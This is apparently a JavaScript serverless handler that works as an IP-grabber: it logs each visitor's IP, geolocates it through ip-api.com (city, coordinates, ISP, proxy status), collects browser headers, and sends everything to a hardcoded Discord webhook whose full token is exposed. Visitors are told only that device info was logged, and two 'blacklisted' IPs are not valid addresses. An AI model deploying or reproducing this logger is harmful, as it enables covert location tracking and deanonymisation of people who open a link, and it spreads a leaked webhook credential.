import fetch from 'node-fetch';

const webhookUrl = "https://discord.com/api/webhooks/1306087539169296484/vP5BQM6ius3zPupcdWazfCNQNpuEFstMUeSYKpVJ5i_vxTxWpdyo2mWcHqQDXC7Y0Tr3";

async function sendToWebhook(message) {
    try {
        await fetch(webhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(message),
        });
    } catch (error) {
        console.error("Failed to send data to webhook:", error);
    }
}

async function getIpDetails(ip) {
    try {
        const response = await fetch(`http://ip-api.com/json/${ip}?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,isp,org,as,mobile,proxy,hosting,query`);
        return await response.json();
    } catch (error) {
        console.error("Failed to retrieve IP information:", error);
        return null;
    }
}

export default async function handler(req, res) {
    if (req.method === 'GET' || req.method === 'POST') {
        const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
        const blacklistedIPs = ["716.147.210.120", "181.55.23.312"];

        if (blacklistedIPs.includes(ip)) {
            res.status(403).send("Forbidden: Your IP address is blacklisted.");
            return;
        }

        const ipDetails = await getIpDetails(ip);
        if (!ipDetails || ipDetails.status !== 'success') {
            res.status(500).send("Failed to retrieve IP information.");
            return;
        }

        // Gather additional information from request headers
        const userAgent = req.headers['user-agent'] || 'Unknown';
        const acceptLanguage = req.headers['accept-language'] || 'Unknown';
        const acceptEncoding = req.headers['accept-encoding'] || 'Unknown';
        const doNotTrack = req.headers['dnt'] === '1' ? 'Yes' : 'No';
        const referer = req.headers['referer'] || 'No referer';

        // Inferred network type based on IP geolocation data (basic inference)
        const inferredNetworkType = ipDetails.mobile ? 'Mobile' : 'Broadband';

        // Prepare the message to send to Discord webhook
        const message = {
            username: "Extended Device Info Logger",
            embeds: [
                {
                    title: "Extended Device and Network Information",
                    color: 0x00FFFF,
                    description: "Device info collected from a server request.",
                    fields: [
                        { name: "IP", value: `\`${ipDetails.query || "Not available"}\``, inline: true },
                        { name: "Provider", value: `\`${ipDetails.isp || "Unknown"}\``, inline: true },
                        { name: "Organization", value: `\`${ipDetails.org || "Unknown"}\``, inline: true },
                        { name: "ASN", value: `\`${ipDetails.as || "Unknown"}\``, inline: true },
                        { name: "Country", value: `\`${ipDetails.country || "Unknown"}\``, inline: true },
                        { name: "Region", value: `\`${ipDetails.regionName || "Unknown"}\``, inline: true },
                        { name: "City", value: `\`${ipDetails.city || "Unknown"}\``, inline: true },
                        { name: "Timezone", value: `\`${ipDetails.timezone || "Unknown"}\``, inline: true },
                        { name: "Latitude", value: `\`${ipDetails.lat || "Unknown"}\``, inline: true },
                        { name: "Longitude", value: `\`${ipDetails.lon || "Unknown"}\``, inline: true },
                        { name: "Device Info", value: `\`${userAgent}\``, inline: false },
                        { name: "Browser Language", value: `\`${acceptLanguage}\``, inline: true },
                        { name: "Network Type", value: `\`${inferredNetworkType}\``, inline: true },
                        { name: "Is Proxy/VPN", value: `\`${ipDetails.proxy ? "Yes" : "No"}\``, inline: true },
                        { name: "Is Hosting Provider", value: `\`${ipDetails.hosting ? "Yes" : "No"}\``, inline: true },
                        { name: "Accept Encoding", value: `\`${acceptEncoding}\``, inline: true },
                        { name: "Do Not Track", value: `\`${doNotTrack}\``, inline: true },
                        { name: "Referer", value: `\`${referer}\``, inline: false }
                    ]
                }
            ]
        };

        await sendToWebhook(message);
        res.status(200).json({ message: "Device info logged." });
    } else {
        res.status(405).send("Method Not Allowed");
    }
}
